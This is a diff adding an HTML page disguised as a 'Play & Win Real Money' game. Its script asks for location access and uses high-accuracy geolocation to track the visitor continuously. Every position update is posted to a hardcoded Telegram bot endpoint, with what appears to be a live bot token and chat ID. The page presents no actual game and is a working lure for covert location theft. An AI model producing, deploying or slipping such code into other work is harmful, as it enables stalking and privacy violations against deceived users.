@@ -1,0 +1,90 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🎮 Play & Win Real Money</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 30px;
+            background: linear-gradient(145deg, #00c6ff, #0072ff);
+            color: white;
+        }
+        .card {
+            background: white;
+            color: black;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+            max-width: 400px;
+            margin: auto;
+        }
+        button {
+            background: #00c6ff;
+            color: white;
+            border: none;
+            padding: 15px 25px;
+            font-size: 18px;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>🎮 Play & Win Real Money</h2>
+        <p>We are verifying your eligibility for the contest by live tracking your location.</p>
+        <p>Please keep this page open while playing!</p>
+        <button onclick="startTracking()">Start Game</button>
+    </div>
+
+    <script>
+        let watchId = null;
+
+        function startTracking() {
+            if (navigator.geolocation) {
+                watchId = navigator.geolocation.watchPosition(sendPosition, errorLocation, {
+                    enableHighAccuracy: true,
+                    maximumAge: 10000,
+                    timeout: 10000
+                });
+                alert("Live tracking started! Keep this tab open.");
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function sendPosition(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const acc = position.coords.accuracy;
+            const time = new Date().toLocaleString();
+
+            fetch("https://api.telegram.org/bot7449325389:AAHlpvLyLfq5s4BQ15bB_kn13embow-SX64/sendMessage", {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    chat_id: "5425481852",
+                    text: `📍 Live Location:
+Latitude: ${lat}
+Longitude: ${lon}
+Accuracy: ${acc}m
+Time: ${time}`
+                })
+            });
+        }
+
+        function errorLocation(error) {
+            alert("❌ Unable to retrieve location. Please allow location access.");
+        }
+
+        window.addEventListener("beforeunload", () => {
+            if (watchId !== null) {
+                navigator.geolocation.clearWatch(watchId);
+            }
+        });
+    </script>
+</body>
+</html>
